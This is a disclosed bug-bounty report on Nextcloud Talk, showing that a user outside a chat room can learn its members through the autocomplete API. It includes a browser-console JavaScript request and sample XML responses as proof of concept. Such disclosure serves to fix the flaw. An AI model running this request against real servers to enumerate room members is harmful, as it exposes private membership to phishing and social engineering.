# Chat room member disclosure via autocomplete API

## Report Details
- **Report ID**: 1850407
- **URL**: https://hackerone.com/reports/1850407
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-29T16:35:36.157Z
- **Disclosed**: 2023-03-25T08:22:11.381Z

## Reporter
- **Username**: lukasreschke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:
Even if you are not a member of a Spreed room, it is possible to find out who is in the room using the autocomplete API. I have not yet checked if this affects other autocomplete share types.

## Steps to reproduce:

Requirements: Three users named "demo", "demo1" and "hacker".

1. Create a new Spreed room as user "demo" (note the room ID)
2. Add user "demo1" to the room
3. Log in as user "hacker" and execute the following in the JavaScript console of your browser Change the `itemId` to the room ID you created earlier.

```
let req = new XMLHttpRequest();
req.open("GET", OC.generateUrl('/ocs/v2.php/core/autocomplete/get?search=demo&itemType=call&itemId=qqads88a&shareTypes[]=0&shareTypes[]=1&shareTypes[]=7&shareTypes[]=4'))
req.setRequestHeader('requesttoken',OC.requestToken)
req.send();
```

4. In the Network tab you will now see the following response:

```
<?xml version="1.0"?>
<ocs>
 <meta
  <status>ok</status>
  <statuscode>200</statuscode>
  <message>OK</message
 </meta>
 <data/>
</ocs>
```

5. Now as user "demo" remove user "demo1" from the chat room.
6. Re-send the request as user "hacker", you will now see that `demo1` is available as a suggestion and therefore not a member of the chat room:

```
<?xml version="1.0"?>
<ocs>
 <meta>
  <status>ok</status>
  <statuscode>200</statuscode>.
  <message>OK</message
 </meta>
 <data>
  <element>
   <id>demo1</id>
   <label>demo1</label>
   <icon>icon-user</icon>
   <source>users</source>
   <status/>
   <subline></subline>
   <shareWithDisplayNameUnique>demo1</shareWithDisplayNameUnique>
  </element>
 </data>
</ocs>
```

## Impact

An attacker could use this vulnerability to gain information about the members of a Spreed chat room, even if they themselves are not members. This information could potentially be used for malicious purposes, such as targeted phishing attacks or social engineering attempts. The impact could depend on the sensitivity of the information being shared in the chat room.

## Attachments
No attachments
